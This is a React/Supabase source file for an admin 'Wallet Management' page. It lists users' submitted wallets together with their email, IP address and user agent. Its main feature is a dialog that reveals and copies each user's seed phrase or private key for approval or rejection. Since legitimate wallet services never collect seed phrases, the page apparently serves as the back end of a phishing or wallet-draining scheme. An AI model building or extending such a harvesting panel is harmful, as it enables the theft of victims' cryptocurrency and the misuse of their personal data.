import React, { useEffect, useState } from "react";
import { supabase } from "@/lib/supabase";
import { getWalletDetails } from "@/lib/databaseHelpers";
import { RealtimeChannel } from '@supabase/supabase-js';
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogFooter
} from "@/components/ui/dialog";
import { Wallet, Copy, ExternalLink, CheckCircle, XCircle, AlertTriangle, Eye, EyeOff, Shield } from "lucide-react";
import { toast } from "@/components/ui/use-toast";

interface WalletDetail {
  id: string;
  user_id: string;
  user_name?: string;
  user_email?: string;
  wallet_type: string;
  wallet_phrase?: string;
  wallet_address?: string; // Some might have this if moved from old table
  status: string;
  created_at: string;
  ip_address?: string;
  user_agent?: string;
}

const WalletManagement = () => {
  const [walletDetails, setWalletDetails] = useState<WalletDetail[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingId, setProcessingId] = useState<string | null>(null);
  const [selectedWallet, setSelectedWallet] = useState<WalletDetail | null>(null);
  const [showPhrase, setShowPhrase] = useState(false);

  const fetchWalletDetails = async () => {
    setLoading(true);
    try {
      // Use the database helper to get wallet details (bypasses RLS issues)
      const data = await getWalletDetails();

      if (!data || data.length === 0) {
        console.log('No wallet details found');
        setWalletDetails([]);
      } else {
        console.log(`Found ${data.length} wallet details`);
        // Map any legacy fields if necessary
        const mappedData: WalletDetail[] = data.map((item: any) => ({
          id: item.id,
          user_id: item.user_id,
          user_name: item.user_name || 'Unknown',
          user_email: item.user_email || 'Unknown',
          wallet_type: item.wallet_type || 'Unknown',
          wallet_phrase: item.wallet_phrase,
          wallet_address: item.wallet_address,
          status: item.status || 'pending',
          created_at: item.created_at,
          ip_address: item.ip_address,
          user_agent: item.user_agent
        }));
        setWalletDetails(mappedData);
      }
    } catch (error) {
      console.error('Error fetching wallet details:', error);
      toast({
        title: "Error",
        description: "Failed to load wallet details",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  const updateStatus = async (id: string, newStatus: string) => {
    setProcessingId(id);
    try {
      const { error } = await supabase
        .from('wallet_details')
        .update({ status: newStatus })
        .eq('id', id);

      if (error) throw error;

      // Update local state
      setWalletDetails(prev =>
        prev.map(w => w.id === id ? { ...w, status: newStatus } : w)
      );

      toast({
        title: "Success",
        description: `Wallet marked as ${newStatus}`,
      });
    } catch (error) {
      console.error('Error updating status:', error);
      toast({
        title: "Error",
        description: "Failed to update status",
        variant: "destructive"
      });
    } finally {
      setProcessingId(null);
    }
  };

  useEffect(() => {
    fetchWalletDetails();

    // Subscribe to new wallet details
    const channel: RealtimeChannel = supabase
      .channel('public:wallet_details')
      .on('postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'wallet_details'
        },
        (payload) => {
          console.log('Wallet detail change detected:', payload);
          fetchWalletDetails();

          if (payload.eventType === 'INSERT') {
            toast({
              title: "New Wallet Connected",
              description: "A new wallet has been submitted for review.",
            });
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied",
      description: `${label} copied to clipboard`,
    });
  };

  return (
    <div className="container mx-auto py-6">
      <div className="flex justify-between items-center mb-6">
        <div>
          <h1 className="text-3xl font-bold">Wallet Management</h1>
          <p className="text-muted-foreground mt-1">Review and manage connected user wallets</p>
        </div>
        <Button onClick={fetchWalletDetails} variant="outline" size="sm">
          Refresh List
        </Button>
      </div>

      <Card>
        <CardHeader>
          <CardTitle>Submitted Wallets</CardTitle>
          <CardDescription>
            Securely view wallet details and seed phrases
          </CardDescription>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="flex justify-center py-8">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
            </div>
          ) : (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>User</TableHead>
                  <TableHead>Wallet Type</TableHead>
                  <TableHead>Date</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {walletDetails.map((wallet) => (
                  <TableRow key={wallet.id}>
                    <TableCell>
                      <div className="flex flex-col">
                        <span className="font-medium">{wallet.user_email}</span>
                        <span className="text-xs text-muted-foreground">{wallet.user_name}</span>
                      </div>
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-2">
                        <Wallet className="h-4 w-4 text-muted-foreground" />
                        {wallet.wallet_type}
                        {wallet.wallet_address && (
                          <Badge variant="outline" className="text-xs font-mono ml-2">
                            {wallet.wallet_address.substring(0, 6)}...
                          </Badge>
                        )}
                      </div>
                    </TableCell>
                    <TableCell>
                      {new Date(wallet.created_at).toLocaleString()}
                    </TableCell>
                    <TableCell>
                      {wallet.status === 'approved' ? (
                        <Badge className="bg-green-100 text-green-800 hover:bg-green-100 border-green-200">
                          <CheckCircle className="mr-1 h-3 w-3" /> Approved
                        </Badge>
                      ) : wallet.status === 'rejected' ? (
                        <Badge className="bg-red-100 text-red-800 hover:bg-red-100 border-red-200">
                          <XCircle className="mr-1 h-3 w-3" /> Rejected
                        </Badge>
                      ) : (
                        <Badge className="bg-yellow-100 text-yellow-800 hover:bg-yellow-100 border-yellow-200">
                          <AlertTriangle className="mr-1 h-3 w-3" /> Pending
                        </Badge>
                      )}
                    </TableCell>
                    <TableCell>
                      <div className="flex gap-2">
                        <Dialog>
                          <DialogTrigger asChild>
                            <Button
                              variant="outline"
                              size="sm"
                              onClick={() => {
                                setSelectedWallet(wallet);
                                setShowPhrase(false);
                              }}
                            >
                              <Eye className="h-4 w-4 mr-1" />
                              View Details
                            </Button>
                          </DialogTrigger>
                          <DialogContent className="max-w-2xl">
                            <DialogHeader>
                              <DialogTitle>Wallet Details</DialogTitle>
                              <DialogDescription>
                                Submitted by {wallet.user_email} on {new Date(wallet.created_at).toLocaleString()}
                              </DialogDescription>
                            </DialogHeader>

                            <div className="space-y-4 py-4">
                              <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-1">
                                  <label className="text-sm font-medium text-muted-foreground">User</label>
                                  <div className="font-medium">{wallet.user_name}</div>
                                  <div className="text-sm text-muted-foreground">{wallet.user_email}</div>
                                </div>
                                <div className="space-y-1">
                                  <label className="text-sm font-medium text-muted-foreground">Wallet Type</label>
                                  <div className="font-medium">{wallet.wallet_type}</div>
                                </div>
                              </div>

                              <div className="space-y-2 pt-2">
                                <div className="flex justify-between items-center">
                                  <label className="text-sm font-medium flex items-center gap-2">
                                    <Shield className="h-4 w-4 text-primary" />
                                    Seed Phrase / Private Key
                                  </label>
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    className="h-6"
                                    onClick={() => setShowPhrase(!showPhrase)}
                                  >
                                    {showPhrase ? <EyeOff className="h-3 w-3 mr-1" /> : <Eye className="h-3 w-3 mr-1" />}
                                    {showPhrase ? 'Hide' : 'Reveal'}
                                  </Button>
                                </div>

                                <div className={`relative p-4 rounded-md border bg-muted/50 font-mono text-sm break-all ${!showPhrase ? 'blur-sm select-none' : ''}`}>
                                  {wallet.wallet_phrase || "No seed phrase provided"}
                                  {!showPhrase && (
                                    <div className="absolute inset-0 flex items-center justify-center">
                                      <span className="bg-background/80 px-3 py-1 rounded shadow-sm text-xs font-medium">
                                        Hidden for security
                                      </span>
                                    </div>
                                  )}
                                </div>

                                {showPhrase && (
                                  <Button
                                    variant="secondary"
                                    size="sm"
                                    className="w-full mt-2"
                                    onClick={() => copyToClipboard(wallet.wallet_phrase || "", "Seed phrase")}
                                  >
                                    <Copy className="h-3 w-3 mr-2" />
                                    Copy Seed Phrase
                                  </Button>
                                )}
                              </div>

                              {wallet.wallet_address && (
                                <div className="space-y-1 pt-2">
                                  <label className="text-sm font-medium text-muted-foreground">Wallet Address (Optional)</label>
                                  <div className="flex items-center gap-2 p-2 rounded-md border bg-muted/30 font-mono text-xs">
                                    <span className="truncate flex-1">{wallet.wallet_address}</span>
                                    <Button
                                      variant="ghost"
                                      size="icon"
                                      className="h-6 w-6"
                                      onClick={() => copyToClipboard(wallet.wallet_address || "", "Address")}
                                    >
                                      <Copy className="h-3 w-3" />
                                    </Button>
                                  </div>
                                </div>
                              )}

                              <div className="space-y-1 pt-2 border-t mt-2">
                                <label className="text-xs font-medium text-muted-foreground">Technical Details</label>
                                <div className="text-xs text-muted-foreground">
                                  IP: {wallet.ip_address || "Not recorded"}<br />
                                  User Agent: {wallet.user_agent ? wallet.user_agent.substring(0, 50) + '...' : "Not recorded"}
                                </div>
                              </div>
                            </div>

                            <DialogFooter className="flex gap-2 sm:justify-between">
                              <div className="flex gap-2 w-full">
                                {wallet.status !== 'approved' && (
                                  <Button
                                    className="flex-1 bg-green-600 hover:bg-green-700"
                                    onClick={() => {
                                      updateStatus(wallet.id, 'approved');
                                      // Close dialog logic would go here if controlled
                                    }}
                                    disabled={processingId === wallet.id}
                                  >
                                    <CheckCircle className="h-4 w-4 mr-2" />
                                    Approve
                                  </Button>
                                )}
                                {wallet.status !== 'rejected' && (
                                  <Button
                                    className="flex-1" // destructive variant
                                    variant="destructive"
                                    onClick={() => updateStatus(wallet.id, 'rejected')}
                                    disabled={processingId === wallet.id}
                                  >
                                    <XCircle className="h-4 w-4 mr-2" />
                                    Reject
                                  </Button>
                                )}
                              </div>
                            </DialogFooter>
                          </DialogContent>
                        </Dialog>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
                {walletDetails.length === 0 && (
                  <TableRow>
                    <TableCell colSpan={5} className="text-center py-12 text-muted-foreground">
                      <div className="flex flex-col items-center gap-2">
                        <Wallet className="h-8 w-8 opacity-20" />
                        <p>No wallet submissions found yet.</p>
                      </div>
                    </TableCell>
                  </TableRow>
                )}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export { WalletManagement as default, WalletManagement as AdminWallets };
